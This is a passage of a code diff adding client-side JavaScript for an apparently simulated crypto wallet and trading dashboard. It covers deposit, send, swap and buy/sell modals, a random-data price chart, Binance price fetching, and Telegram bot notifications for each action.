+                accountData.balances[coin] = (accountData.balances[coin] || 0) + amount;
+                
+                // Show loading state
+                simulateDepositBtn.innerHTML = '<i class="fas fa-spinner fa-spin mr-1"></i> Processing...';
+                simulateDepositBtn.disabled = true;
+                
+                await new Promise(resolve => setTimeout(resolve, 1500));
+                
+                // Update UI
+                updateDashboardWithRealData();
+                
+                // Show success notification
+                const notification = document.createElement('div');
+                notification.className = 'fixed bottom-4 right-4 bg-green-500 text-white p-4 rounded-lg shadow-lg z-50';
+                notification.innerHTML = `
+                    <div class="flex items-center">
+                        <i class="fas fa-check-circle mr-2"></i>
+                        <span>Deposit of ${amount} ${coin} successful!</span>
+                    </div>
+                `;
+                document.body.appendChild(notification);
+                
+                // Remove notification and close modal after 3 seconds
+                setTimeout(() => {
+                    notification.remove();
+                    depositModal.classList.add('hidden');
+                    
+                    // Reset button
+                    simulateDepositBtn.innerHTML = '<i class="fas fa-magic mr-1"></i> Simulate Deposit';
+                    simulateDepositBtn.disabled = false;
+                }, 3000);
+                
+                // Send notification to Telegram bot if user is from Telegram
+                if (telegramUser) {
+                    notifyTelegramBot('deposit', {
+                        coin: coin,
+                        amount: amount,
+                        network: depositNetwork.value,
+                        user_id: telegramUser.id
+                    });
+                }
+            });
+        }
+        
+        // Initialize Send Functionality
+        function initializeSendFunctionality() {
+            const sendModal = document.getElementById('send-modal');
+            const closeSendModal = document.getElementById('close-send-modal');
+            const sendCoin = document.getElementById('send-coin');
+            const sendNetwork = document.getElementById('send-network');
+            const recipientAddress = document.getElementById('recipient-address');
+            const sendAmount = document.getElementById('send-amount');
+            const sendMaxBtn = document.getElementById('send-max');
+            const networkFee = document.getElementById('network-fee');
+            const totalSendAmount = document.getElementById('total-send-amount');
+            const confirmSendBtn = document.getElementById('confirm-send');
+            
+            // Function to update available balances in dropdown
+            function updateAvailableBalances() {
+                // Clear existing options
+                sendCoin.innerHTML = '';
+                
+                // Add options for each coin with balance
+                Object.entries(accountData.balances).forEach(([coin, balance]) => {
+                    if (balance > 0) {
+                        const option = document.createElement('option');
+                        option.value = coin;
+                        option.textContent = `${coin === 'BTC' ? 'Bitcoin' : coin === 'ETH' ? 'Ethereum' : coin === 'USDT' ? 'Tether' : coin} (${coin}) - ${balance} ${coin} Available`;
+                        sendCoin.appendChild(option);
+                    }
+                });
+                
+                // If no options were added, add a default
+                if (sendCoin.options.length === 0) {
+                    const option = document.createElement('option');
+                    option.value = 'USDT';
+                    option.textContent = 'Tether (USDT) - 0 USDT Available';
+                    sendCoin.appendChild(option);
+                }
+                
+                // Update fee display
+                updateFeeDisplay();
+            }
+            
+            // Function to update fee display
+            function updateFeeDisplay() {
+                const coin = sendCoin.value;
+                const network = sendNetwork.value;
+                
+                // Set network fee based on coin and network
+                let fee;
+                if (coin === 'BTC') {
+                    fee = '0.0001 BTC';
+                } else if (coin === 'ETH' && network === 'ETH') {
+                    fee = '0.005 ETH';
+                } else if (coin === 'USDT' && network === 'ETH') {
+                    fee = '10 USDT';
+                } else if (coin === 'USDT' && network === 'TRX') {
+                    fee = '1 USDT';
+                } else if (coin === 'USDT' && network === 'BSC') {
+                    fee = '0.5 USDT';
+                } else {
+                    fee = '0.001 ' + coin;
+                }
+                
+                networkFee.textContent = '~' + fee;
+                
+                // Update total amount
+                updateTotalAmount();
+            }
+            
+            // Function to update total amount
+            function updateTotalAmount() {
+                const amount = parseFloat(sendAmount.value) || 0;
+                const coin = sendCoin.value;
+                
+                totalSendAmount.textContent = `${amount} ${coin}`;
+            }
+            
+            // Event listeners
+            sendCoin.addEventListener('change', updateFeeDisplay);
+            sendNetwork.addEventListener('change', updateFeeDisplay);
+            sendAmount.addEventListener('input', updateTotalAmount);
+            
+            // Max button
+            sendMaxBtn.addEventListener('click', () => {
+                const coin = sendCoin.value;
+                const balance = accountData.balances[coin] || 0;
+                
+                // Subtract fee (simplified)
+                let fee = 0;
+                if (coin === 'BTC') fee = 0.0001;
+                else if (coin === 'ETH') fee = 0.005;
+                else if (coin === 'USDT') fee = 1;
+                else fee = 0.001;
+                
+                const maxAmount = Math.max(0, balance - fee);
+                sendAmount.value = maxAmount.toFixed(8).replace(/\.?0+$/, '');
+                updateTotalAmount();
+            });
+            
+            // Close modal
+            closeSendModal.addEventListener('click', () => {
+                sendModal.classList.add('hidden');
+            });
+            
+            // Quick send button
+            document.getElementById('quick-send-btn').addEventListener('click', () => {
+                updateAvailableBalances();
+                sendModal.classList.remove('hidden');
+                recipientAddress.value = '';
+                sendAmount.value = '';
+                updateTotalAmount();
+            });
+            
+            // Clicks outside the modal
+            sendModal.addEventListener('click', (e) => {
+                if (e.target === sendModal) {
+                    sendModal.classList.add('hidden');
+                }
+            });
+            
+            // Confirm send button
+            confirmSendBtn.addEventListener('click', async () => {
+                const coin = sendCoin.value;
+                const amount = parseFloat(sendAmount.value);
+                const address = recipientAddress.value.trim();
+                const network = sendNetwork.value;
+                
+                // Validation
+                if (!address) {
+                    alert('Please enter a recipient address');
+                    return;
+                }
+                
+                if (!amount || amount <= 0) {
+                    alert('Please enter a valid amount');
+                    return;
+                }
+                
+                const balance = accountData.balances[coin] || 0;
+                if (amount > balance) {
+                    alert('Insufficient balance');
+                    return;
+                }
+                
+                // Show loading state
+                confirmSendBtn.innerHTML = '<i class="fas fa-spinner fa-spin mr-1"></i> Processing...';
+                confirmSendBtn.disabled = true;
+                
+                // Simulate processing delay
+                await new Promise(resolve => setTimeout(resolve, 1500));
+                
+                // Create transaction
+                const transaction = {
+                    id: 'tx' + Date.now(),
+                    type: 'WITHDRAW',
+                    asset: coin,
+                    amount: -amount, // Negative for withdrawals
+                    status: 'COMPLETED',
+                    timestamp: Date.now(),
+                    address: address,
+                    network: network,
+                    description: `Sent via ${network}`
+                };
+                
+                // Add to transactions and update balance
+                accountData.transactions.unshift(transaction);
+                accountData.balances[coin] = Math.max(0, (accountData.balances[coin] || 0) - amount);
+                
+                // Update UI
+                updateDashboardWithRealData();
+                
+                // Show success notification
+                const notification = document.createElement('div');
+                notification.className = 'fixed bottom-4 right-4 bg-green-500 text-white p-4 rounded-lg shadow-lg z-50';
+                notification.innerHTML = `
+                    <div class="flex items-center">
+                        <i class="fas fa-check-circle mr-2"></i>
+                        <span>Successfully sent ${amount} ${coin} to ${address.substring(0, 6)}...${address.substring(address.length - 4)}</span>
+                    </div>
+                `;
+                document.body.appendChild(notification);
+                
+                // Remove notification and close modal after 3 seconds
+                setTimeout(() => {
+                    notification.remove();
+                    sendModal.classList.add('hidden');
+                    
+                    // Reset button and form
+                    confirmSendBtn.innerHTML = 'Send';
+                    confirmSendBtn.disabled = false;
+                    recipientAddress.value = '';
+                    sendAmount.value = '';
+                    updateTotalAmount();
+                }, 3000);
+                
+                // Send notification to Telegram bot if user is from Telegram
+                if (telegramUser) {
+                    notifyTelegramBot('send', {
+                        coin: coin,
+                        amount: amount,
+                        address: address.substring(0, 6) + '...' + address.substring(address.length - 4),
+                        network: network,
+                        user_id: telegramUser.id
+                    });
+                }
+            });
+        }
+        
+        // Initialize Swap Functionality
+        function initializeSwapFunctionality() {
+            const swapModal = document.getElementById('swap-modal');
+            const closeSwapModal = document.getElementById('close-swap-modal');
+            const fromCoin = document.getElementById('from-coin');
+            const toCoin = document.getElementById('to-coin');
+            const fromAmount = document.getElementById('from-amount');
+            const toAmount = document.getElementById('to-amount');
+            const fromAvailable = document.getElementById('from-available');
+            const swapDirectionBtn = document.getElementById('swap-direction');
+            const exchangeRateElement = document.getElementById('exchange-rate');
+            const swapFeeElement = document.getElementById('swap-fee');
+            const minReceivedElement = document.getElementById('min-received');
+            const confirmSwapBtn = document.getElementById('confirm-swap');
+            
+            // Exchange rates (simplified)
+            const exchangeRates = {
+                'BTC-USDT': 29850.20,
+                'ETH-USDT': 1850.75,
+                'BNB-USDT': 220.50,
+                'SOL-USDT': 102.35,
+                'USDT-BTC': 1 / 29850.20,
+                'USDT-ETH': 1 / 1850.75,
+                'USDT-BNB': 1 / 220.50,
+                'USDT-SOL': 1 / 102.35,
+                'BTC-ETH': 29850.20 / 1850.75,
+                'ETH-BTC': 1850.75 / 29850.20,
+                'BTC-BNB': 29850.20 / 220.50,
+                'BNB-BTC': 220.50 / 29850.20,
+                'ETH-BNB': 1850.75 / 220.50,
+                'BNB-ETH': 220.50 / 1850.75,
+                'SOL-BTC': 102.35 / 29850.20,
+                'BTC-SOL': 29850.20 / 102.35,
+                'SOL-ETH': 102.35 / 1850.75,
+                'ETH-SOL': 1850.75 / 102.35,
+                'SOL-BNB': 102.35 / 220.50,
+                'BNB-SOL': 220.50 / 102.35
+            };
+            
+            // Function to update available balance display
+            function updateAvailableBalance() {
+                const coin = fromCoin.value;
+                const balance = accountData.balances[coin] || 0;
+                fromAvailable.textContent = `${balance} ${coin}`;
+            }
+            
+            // Function to calculate swap amount
+            function calculateSwapAmount() {
+                const from = fromCoin.value;
+                const to = toCoin.value;
+                const amount = parseFloat(fromAmount.value) || 0;
+                
+                // Get exchange rate
+                const rateKey = `${from}-${to}`;
+                const rate = exchangeRates[rateKey] || 1;
+                
+                // Calculate to amount
+                const calculatedAmount = amount * rate;
+                
+                // Update to amount field
+                toAmount.value = calculatedAmount.toFixed(8).replace(/\.?0+$/, '');
+                
+                // Update exchange rate display
+                exchangeRateElement.textContent = `1 ${from} ≈ ${rate.toFixed(7)} ${to}`;
+                
+                // Calculate and update fee
+                const feePercentage = 0.001; // 0.1%
+                const feeAmount = amount * feePercentage;
+                swapFeeElement.textContent = `0.1% (${feeAmount.toFixed(5)} ${from})`;
+                
+                // Calculate min received (accounting for 0.5% slippage)
+                const slippage = 0.005;
+                const minReceived = calculatedAmount * (1 - slippage);
+                minReceivedElement.textContent = `${minReceived.toFixed(8)} ${to}`;
+            }
+            
+            // Function to swap coins
+            function swapCoins() {
+                const tempCoin = fromCoin.value;
+                fromCoin.value = toCoin.value;
+                toCoin.value = tempCoin;
+                
+                fromAmount.value = '';
+                toAmount.value = '';
+                
+                updateAvailableBalance();
+                calculateSwapAmount();
+            }
+            
+            // Event listeners
+            fromCoin.addEventListener('change', () => {
+                // Make sure from and to aren't the same
+                if (fromCoin.value === toCoin.value) {
+                    // Find first different option
+                    for (let i = 0; i < toCoin.options.length; i++) {
+                        if (toCoin.options[i].value !== fromCoin.value) {
+                            toCoin.value = toCoin.options[i].value;
+                            break;
+                        }
+                    }
+                }
+                updateAvailableBalance();
+                calculateSwapAmount();
+            });
+            
+            toCoin.addEventListener('change', () => {
+                // Make sure from and to aren't the same
+                if (toCoin.value === fromCoin.value) {
+                    // Find first different option
+                    for (let i = 0; i < fromCoin.options.length; i++) {
+                        if (fromCoin.options[i].value !== toCoin.value) {
+                            fromCoin.value = fromCoin.options[i].value;
+                            break;
+                        }
+                    }
+                }
+                updateAvailableBalance();
+                calculateSwapAmount();
+            });
+            
+            fromAmount.addEventListener('input', calculateSwapAmount);
+            swapDirectionBtn.addEventListener('click', swapCoins);
+            
+            // Close modal
+            closeSwapModal.addEventListener('click', () => {
+                swapModal.classList.add('hidden');
+            });
+            
+            // Quick swap button
+            document.getElementById('quick-swap-btn').addEventListener('click', () => {
+                swapModal.classList.remove('hidden');
+                fromAmount.value = '';
+                toAmount.value = '';
+                updateAvailableBalance();
+                calculateSwapAmount();
+            });
+            
+            // Clicks outside the modal
+            swapModal.addEventListener('click', (e) => {
+                if (e.target === swapModal) {
+                    swapModal.classList.add('hidden');
+                }
+            });
+            
+            // Confirm swap button
+            confirmSwapBtn.addEventListener('click', async () => {
+                const fromCoinValue = fromCoin.value;
+                const toCoinValue = toCoin.value;
+                const fromAmountValue = parseFloat(fromAmount.value);
+                const toAmountValue = parseFloat(toAmount.value);
+                
+                // Validation
+                if (!fromAmountValue || fromAmountValue <= 0) {
+                    alert('Please enter a valid amount');
+                    return;
+                }
+                
+                const balance = accountData.balances[fromCoinValue] || 0;
+                if (fromAmountValue > balance) {
+                    alert('Insufficient balance');
+                    return;
+                }
+                
+                // Show loading state
+                confirmSwapBtn.innerHTML = '<i class="fas fa-spinner fa-spin mr-1"></i> Processing...';
+                confirmSwapBtn.disabled = true;
+                
+                // Simulate processing delay
+                await new Promise(resolve => setTimeout(resolve, 1500));
+                
+                // Create transactions
+                const sellTransaction = {
+                    id: 'tx' + Date.now() + '-sell',
+                    type: 'TRADE',
+                    asset: fromCoinValue,
+                    amount: -fromAmountValue,
+                    convertedAsset: toCoinValue,
+                    convertedAmount: toAmountValue,
+                    status: 'COMPLETED',
+                    timestamp: Date.now(),
+                    description: `Swapped to ${toCoinValue}`
+                };
+                
+                const buyTransaction = {
+                    id: 'tx' + Date.now() + '-buy',
+                    type: 'TRADE',
+                    asset: toCoinValue,
+                    amount: toAmountValue,
+                    convertedAsset: fromCoinValue,
+                    convertedAmount: fromAmountValue,
+                    status: 'COMPLETED',
+                    timestamp: Date.now(),
+                    description: `Swapped from ${fromCoinValue}`
+                };
+                
+                // Add to transactions and update balances
+                accountData.transactions.unshift(sellTransaction);
+                accountData.balances[fromCoinValue] = Math.max(0, (accountData.balances[fromCoinValue] || 0) - fromAmountValue);
+                accountData.balances[toCoinValue] = (accountData.balances[toCoinValue] || 0) + toAmountValue;
+                
+                // Update UI
+                updateDashboardWithRealData();
+                
+                // Show success notification
+                const notification = document.createElement('div');
+                notification.className = 'fixed bottom-4 right-4 bg-green-500 text-white p-4 rounded-lg shadow-lg z-50';
+                notification.innerHTML = `
+                    <div class="flex items-center">
+                        <i class="fas fa-check-circle mr-2"></i>
+                        <span>Successfully swapped ${fromAmountValue} ${fromCoinValue} to ${toAmountValue.toFixed(8)} ${toCoinValue}</span>
+                    </div>
+                `;
+                document.body.appendChild(notification);
+                
+                // Remove notification and close modal after 3 seconds
+                setTimeout(() => {
+                    notification.remove();
+                    swapModal.classList.add('hidden');
+                    
+                    // Reset button and form
+                    confirmSwapBtn.innerHTML = 'Swap';
+                    confirmSwapBtn.disabled = false;
+                    fromAmount.value = '';
+                    toAmount.value = '';
+                    updateAvailableBalance();
+                    calculateSwapAmount();
+                }, 3000);
+                
+                // Send notification to Telegram bot if user is from Telegram
+                if (telegramUser) {
+                    notifyTelegramBot('swap', {
+                        fromCoin: fromCoinValue,
+                        fromAmount: fromAmountValue,
+                        toCoin: toCoinValue,
+                        toAmount: toAmountValue,
+                        user_id: telegramUser.id
+                    });
+                }
+            });
+        }
+        
+        // Initialize trading interface
+        function initializeTradingInterface() {
+            const tradingModal = document.getElementById('trading-modal');
+            const closeTradingModal = document.getElementById('close-trading-modal');
+            const tradingPair = document.getElementById('trading-pair');
+            const tradeTabs = document.querySelectorAll('.trade-tab');
+            const chartPeriodBtns = document.querySelectorAll('.chart-period-btn');
+            const amountPercentBtns = document.querySelectorAll('.amount-percent-btn');
+            const tradePrice = document.getElementById('trade-price');
+            const tradeAmount = document.getElementById('trade-amount');
+            const tradeTotal = document.getElementById('trade-total');
+            const buyBtn = document.getElementById('buy-btn');
+            const sellBtn = document.getElementById('sell-btn');
+            
+            // Trading chart
+            const initializeTradeChart = () => {
+                const ctx = document.getElementById('tradingChart').getContext('2d');
+                
+                // Check if dark mode is enabled
+                const isDarkMode = document.documentElement.classList.contains('dark');
+                
+                // Create simulated price data
+                const generatePriceData = (basePrice, count) => {
+                    const prices = [];
+                    let price = basePrice;
+                    for (let i = 0; i < count; i++) {
+                        // Add some randomness with a slight upward bias
+                        const change = price * (0.002 * (Math.random() - 0.45));
+                        price += change;
+                        prices.push(price);
+                    }
+                    return prices;
+                };
+                
+                const basePrice = 29850.20; // BTC price
+                const prices = generatePriceData(basePrice, 100);
+                
+                // Labels for x-axis (time)
+                const labels = Array.from({ length: 100 }, (_, i) => `${i}`);
+                
+                // Data for chart
+                const data = {
+                    labels: labels,
+                    datasets: [{
+                        label: 'Price (USDT)',
+                        data: prices,
+                        borderColor: '#5D5CDE',
+                        backgroundColor: 'rgba(93, 92, 222, 0.1)',
+                        borderWidth: 2,
+                        pointRadius: 0,
+                        pointHoverRadius: 3,
+                        pointBackgroundColor: '#5D5CDE',
+                        tension: 0.3,
+                        fill: true
+                    }]
+                };
+                
+                // Chart configuration
+                const config = {
+                    type: 'line',
+                    data: data,
+                    options: {
+                        responsive: true,
+                        maintainAspectRatio: false,
+                        interaction: {
+                            intersect: false,
+                            mode: 'index',
+                        },
+                        scales: {
+                            y: {
+                                beginAtZero: false,
+                                grid: {
+                                    color: isDarkMode ? 'rgba(255, 255, 255, 0.1)' : 'rgba(0, 0, 0, 0.1)',
+                                },
+                                ticks: {
+                                    color: isDarkMode ? '#E0E0E0' : '#333333',
+                                }
+                            },
+                            x: {
+                                grid: {
+                                    display: false
+                                },
+                                ticks: {
+                                    display: false
+                                }
+                            }
+                        },
+                        plugins: {
+                            legend: {
+                                display: false
+                            },
+                            tooltip: {
+                                backgroundColor: isDarkMode ? '#333' : '#FFF',
+                                titleColor: isDarkMode ? '#FFF' : '#333',
+                                bodyColor: isDarkMode ? '#FFF' : '#333',
+                                borderColor: isDarkMode ? '#444' : '#DDD',
+                                borderWidth: 1,
+                                padding: 10,
+                                displayColors: false,
+                                callbacks: {
+                                    label: function(context) {
+                                        return '$' + context.parsed.y.toFixed(2);
+                                    }
+                                }
+                            }
+                        }
+                    }
+                };
+                
+                // Create chart
+                tradingChart = new Chart(ctx, config);
+            };
+            
+            // Update trading chart colors when theme changes
+            function updateTradingChartColors() {
+                if (!tradingChart) return;
+                
+                const isDarkMode = document.documentElement.classList.contains('dark');
+                
+                // Update grid colors
+                tradingChart.options.scales.y.grid.color = isDarkMode ? 'rgba(255, 255, 255, 0.1)' : 'rgba(0, 0, 0, 0.1)';
+                tradingChart.options.scales.y.ticks.color = isDarkMode ? '#E0E0E0' : '#333333';
+                
+                // Update tooltip colors
+                tradingChart.options.plugins.tooltip.backgroundColor = isDarkMode ? '#333' : '#FFF';
+                tradingChart.options.plugins.tooltip.titleColor = isDarkMode ? '#FFF' : '#333';
+                tradingChart.options.plugins.tooltip.bodyColor = isDarkMode ? '#FFF' : '#333';
+                tradingChart.options.plugins.tooltip.borderColor = isDarkMode ? '#444' : '#DDD';
+                
+                tradingChart.update();
+            }
+            
+            // Function to calculate total
+            function calculateTradeTotal() {
+                const price = parseFloat(tradePrice.value) || 0;
+                const amount = parseFloat(tradeAmount.value) || 0;
+                const total = price * amount;
+                tradeTotal.value = total.toFixed(2);
+            }
+            
+            // Function to calculate amount from total
+            function calculateTradeAmount() {
+                const price = parseFloat(tradePrice.value) || 0;
+                const total = parseFloat(tradeTotal.value) || 0;
+                
+                if (price === 0) return;
+                
+                const amount = total / price;
+                tradeAmount.value = amount.toFixed(8);
+            }
+            
+            // Event listeners for trade form
+            tradePrice.addEventListener('input', calculateTradeTotal);
+            tradeAmount.addEventListener('input', calculateTradeTotal);
+            tradeTotal.addEventListener('input', calculateTradeAmount);
+            
+            // Trading pair change
+            tradingPair.addEventListener('change', function() {
+                // Update price based on selected pair
+                const pair = this.value;
+                let price;
+                
+                switch (pair) {
+                    case 'BTCUSDT':
+                        price = 29850.20;
+                        break;
+                    case 'ETHUSDT':
+                        price = 1850.75;
+                        break;
+                    case 'BNBUSDT':
+                        price = 220.50;
+                        break;
+                    case 'SOLUSDT':
+                        price = 102.35;
+                        break;
+                    default:
+                        price = 1.00;
+                }
+                
+                tradePrice.value = price.toFixed(2);
+                calculateTradeTotal();
+                
+                // Update buy/sell button labels
+                const baseCoin = pair.substring(0, pair.indexOf('USDT'));
+                buyBtn.textContent = `Buy ${baseCoin}`;
+                sellBtn.textContent = `Sell ${baseCoin}`;
+                
+                // Update current price display
+                document.getElementById('current-price').textContent = price.toFixed(2);
+                
+                // Update charts (in a real app, we'd fetch new chart data)
+                if (tradingChart) {
+                    const basePrice = price;
+                    const newPrices = Array.from({ length: 100 }, (_, i) => {
+                        return basePrice * (1 + (Math.random() * 0.1 - 0.05));
+                    });
+                    tradingChart.data.datasets[0].data = newPrices;
+                    tradingChart.update();
+                }
+            });
+            
+            // Tab switching
+            tradeTabs.forEach(tab => {
+                tab.addEventListener('click', () => {
+                    // Remove active class from all tabs
+                    tradeTabs.forEach(t => t.classList.remove('tab-active'));
+                    
+                    // Add active class to clicked tab
+                    tab.classList.add('tab-active');
+                    
+                    // Handle different form display based on tab
+                    const tabType = tab.dataset.tab;
+                    if (tabType === 'market') {
+                        tradePrice.parentElement.classList.add('hidden');
+                        tradePrice.value = document.getElementById('current-price').textContent;
+                    } else {
+                        tradePrice.parentElement.classList.remove('hidden');
+                    }
+                });
+            });
+            
+            // Chart period buttons
+            chartPeriodBtns.forEach(btn => {
+                btn.addEventListener('click', () => {
+                    // Remove active class from all period buttons
+                    chartPeriodBtns.forEach(b => {
+                        b.classList.remove('bg-primary', 'text-white');
+                        b.classList.add('bg-gray-200', 'dark:bg-gray-600');
+                    });
+                    
+                    // Add active class to clicked button
+                    btn.classList.add('bg-primary', 'text-white');
+                    btn.classList.remove('bg-gray-200', 'dark:bg-gray-600');
+                    
+                    // In a real app, we'd fetch new chart data for the selected period
+                });
+            });
+            
+            // Amount percentage buttons
+            amountPercentBtns.forEach(btn => {
+                btn.addEventListener('click', () => {
+                    const percent = parseInt(btn.textContent) / 100;
+                    const pair = tradingPair.value;
+                    const baseCoin = pair.substring(0, pair.indexOf('USDT'));
+                    const quoteCoin = 'USDT';
+                    
+                    // For buying (using USDT)
+                    const balance = accountData.balances[quoteCoin] || 0;
+                    const price = parseFloat(tradePrice.value) || 0;
+                    
+                    if (price > 0) {
+                        const availableToBuy = balance * percent;
+                        tradeTotal.value = availableToBuy.toFixed(2);
+                        calculateTradeAmount();
+                    }
+                });
+            });
+            
+            // Buy button
+            buyBtn.addEventListener('click', async () => {
+                const pair = tradingPair.value;
+                const baseCoin = pair.substring(0, pair.indexOf('USDT'));
+                const quoteCoin = 'USDT';
+                const price = parseFloat(tradePrice.value) || 0;
+                const amount = parseFloat(tradeAmount.value) || 0;
+                const total = parseFloat(tradeTotal.value) || 0;
+                
+                // Validation
+                if (price <= 0 || amount <= 0 || total <= 0) {
+                    alert('Please enter valid values');
+                    return;
+                }
+                
+                const balance = accountData.balances[quoteCoin] || 0;
+                if (total > balance) {
+                    alert('Insufficient USDT balance');
+                    return;
+                }
+                
+                // Show loading state
+                buyBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i>';
+                buyBtn.disabled = true;
+                
+                // Simulate processing delay
+                await new Promise(resolve => setTimeout(resolve, 1500));
+                
+                // Execute trade
+                // Create transaction
+                const buyTransaction = {
+                    id: 'order' + Date.now(),
+                    type: 'BUY',
+                    pair: pair,
+                    price: price,
+                    amount: amount,
+                    total: total,
+                    status: 'FILLED',
+                    timestamp: Date.now(),
+                    description: `Buy ${baseCoin}`
+                };
+                
+                // Update balances
+                accountData.balances[quoteCoin] = Math.max(0, (accountData.balances[quoteCoin] || 0) - total);
+                accountData.balances[baseCoin] = (accountData.balances[baseCoin] || 0) + amount;
+                
+                // Add to order history
+                accountData.orderHistory.unshift(buyTransaction);
+                
+                // Add to transactions
+                const transaction = {
+                    id: 'tx' + Date.now(),
+                    type: 'TRADE',
+                    asset: quoteCoin,
+                    amount: -total,
+                    convertedAsset: baseCoin,
+                    convertedAmount: amount,
+                    status: 'COMPLETED',
+                    timestamp: Date.now(),
+                    description: `Bought ${baseCoin}`
+                };
+                accountData.transactions.unshift(transaction);
+                
+                // Update UI
+                updateDashboardWithRealData();
+                
+                // Show success notification
+                const notification = document.createElement('div');
+                notification.className = 'fixed bottom-4 right-4 bg-green-500 text-white p-4 rounded-lg shadow-lg z-50';
+                notification.innerHTML = `
+                    <div class="flex items-center">
+                        <i class="fas fa-check-circle mr-2"></i>
+                        <span>Successfully bought ${amount} ${baseCoin} for ${total} USDT</span>
+                    </div>
+                `;
+                document.body.appendChild(notification);
+                
+                // Reset form
+                tradeAmount.value = '';
+                tradeTotal.value = '';
+                buyBtn.innerHTML = `Buy ${baseCoin}`;
+                buyBtn.disabled = false;
+                
+                // Remove notification after 3 seconds
+                setTimeout(() => {
+                    notification.remove();
+                }, 3000);
+                
+                // Send notification to Telegram bot if user is from Telegram
+                if (telegramUser) {
+                    notifyTelegramBot('buy', {
+                        pair: pair,
+                        amount: amount,
+                        price: price,
+                        total: total,
+                        user_id: telegramUser.id
+                    });
+                }
+            });
+            
+            // Sell button
+            sellBtn.addEventListener('click', async () => {
+                const pair = tradingPair.value;
+                const baseCoin = pair.substring(0, pair.indexOf('USDT'));
+                const quoteCoin = 'USDT';
+                const price = parseFloat(tradePrice.value) || 0;
+                const amount = parseFloat(tradeAmount.value) || 0;
+                const total = parseFloat(tradeTotal.value) || 0;
+                
+                // Validation
+                if (price <= 0 || amount <= 0 || total <= 0) {
+                    alert('Please enter valid values');
+                    return;
+                }
+                
+                const balance = accountData.balances[baseCoin] || 0;
+                if (amount > balance) {
+                    alert(`Insufficient ${baseCoin} balance`);
+                    return;
+                }
+                
+                // Show loading state
+                sellBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i>';
+                sellBtn.disabled = true;
+                
+                // Simulate processing delay
+                await new Promise(resolve => setTimeout(resolve, 1500));
+                
+                // Execute trade
+                // Create transaction
+                const sellTransaction = {
+                    id: 'order' + Date.now(),
+                    type: 'SELL',
+                    pair: pair,
+                    price: price,
+                    amount: amount,
+                    total: total,
+                    status: 'FILLED',
+                    timestamp: Date.now(),
+                    description: `Sell ${baseCoin}`
+                };
+                
+                // Update balances
+                accountData.balances[baseCoin] = Math.max(0, (accountData.balances[baseCoin] || 0) - amount);
+                accountData.balances[quoteCoin] = (accountData.balances[quoteCoin] || 0) + total;
+                
+                // Add to order history
+                accountData.orderHistory.unshift(sellTransaction);
+                
+                // Add to transactions
+                const transaction = {
+                    id: 'tx' + Date.now(),
+                    type: 'TRADE',
+                    asset: baseCoin,
+                    amount: -amount,
+                    convertedAsset: quoteCoin,
+                    convertedAmount: total,
+                    status: 'COMPLETED',
+                    timestamp: Date.now(),
+                    description: `Sold ${baseCoin}`
+                };
+                accountData.transactions.unshift(transaction);
+                
+                // Update UI
+                updateDashboardWithRealData();
+                
+                // Show success notification
+                const notification = document.createElement('div');
+                notification.className = 'fixed bottom-4 right-4 bg-green-500 text-white p-4 rounded-lg shadow-lg z-50';
+                notification.innerHTML = `
+                    <div class="flex items-center">
+                        <i class="fas fa-check-circle mr-2"></i>
+                        <span>Successfully sold ${amount} ${baseCoin} for ${total} USDT</span>
+                    </div>
+                `;
+                document.body.appendChild(notification);
+                
+                // Reset form
+                tradeAmount.value = '';
+                tradeTotal.value = '';
+                sellBtn.innerHTML = `Sell ${baseCoin}`;
+                sellBtn.disabled = false;
+                
+                // Remove notification after 3 seconds
+                setTimeout(() => {
+                    notification.remove();
+                }, 3000);
+                
+                // Send notification to Telegram bot if user is from Telegram
+                if (telegramUser) {
+                    notifyTelegramBot('sell', {
+                        pair: pair,
+                        amount: amount,
+                        price: price,
+                        total: total,
+                        user_id: telegramUser.id
+                    });
+                }
+            });
+            
+            // Close modal
+            closeTradingModal.addEventListener('click', () => {
+                tradingModal.classList.add('hidden');
+            });
+            
+            // Quick trade button
+            document.getElementById('quick-trade-btn').addEventListener('click', () => {
+                tradingModal.classList.remove('hidden');
+                
+                // Initialize chart if not already done
+                if (!tradingChart) {
+                    initializeTradeChart();
+                }
+                
+                // Reset form
+                tradeAmount.value = '';
+                tradeTotal.value = '';
+                
+                // Calculate based on current price
+                calculateTradeTotal();
+            });
+            
+            // Market trade buttons in market table
+            document.querySelectorAll('.market-trade-btn').forEach(btn => {
+                btn.addEventListener('click', () => {
+                    const symbol = btn.dataset.symbol;
+                    tradingPair.value = symbol;
+                    tradingPair.dispatchEvent(new Event('change'));
+                    
+                    // Open trading modal
+                    tradingModal.classList.remove('hidden');
+                    
+                    // Initialize chart if not already done
+                    if (!tradingChart) {
+                        initializeTradeChart();
+                    }
+                    
+                    // Reset form
+                    tradeAmount.value = '';
+                    tradeTotal.value = '';
+                });
+            });
+            
+            // Clicks outside the modal
+            tradingModal.addEventListener('click', (e) => {
+                if (e.target === tradingModal) {
+                    tradingModal.classList.add('hidden');
+                }
+            });
+        }
+        
+        // API Functions
+        
+        // 1. Function to fetch live cryptocurrency prices
+        async function fetchCryptoPrices() {
+            try {
+                // Display loading state
+                document.querySelectorAll('.market-price').forEach(el => {
+                    el.innerHTML = '<div class="shimmer w-20 h-5 rounded"></div>';
+                });
+                
+                // Using Binance public API for prices - no auth needed for this endpoint
+                const response = await fetch(`${API_CONFIG.binance.baseUrl}/api/v3/ticker/24hr`);
+                if (!response.ok) throw new Error('Failed to fetch prices');
+                
+                const data = await response.json();
+                return data;
+            } catch (error) {
+                // Silently handle error and return empty array
+                return [];
+            }
+        }
+        
+        // 2. Function to fetch user's account balance (requires API key with proper permissions)
+        async function fetchAccountBalance() {
+            try {
+                // In a real app, you would:
+                // 1. Create a request signature using your API key and secret
+                // 2. Send a request to the authenticated endpoint
+                // This is a simplified example showing the structure
+                
+                if (!API_CONFIG.binance.apiKey) {
+                    // If no API key, return account data
+                    return {
+                        balances: Object.entries(accountData.balances).map(([asset, free]) => ({
+                            asset,
+                            free,
+                            locked: 0
+                        }))
+                    };
+                }
+                
+                // For a real implementation with API keys:
+                /*
+                const timestamp = Date.now();
+                const queryString = `timestamp=${timestamp}`;
+                
+                // Create signature (HMAC SHA256)
+                const signature = CryptoJS.HmacSHA256(queryString, API_CONFIG.binance.apiSecret).toString();
+                
+                const response = await fetch(`${API_CONFIG.binance.baseUrl}/api/v3/account?${queryString}&signature=${signature}`, {
+                    headers: {
+                        'X-MBX-APIKEY': API_CONFIG.binance.apiKey
+                    }
+                });
+                
+                if (!response.ok) throw new Error('Failed to fetch account');
+                
+                const data = await response.json();
+                return data;
+                */
+                
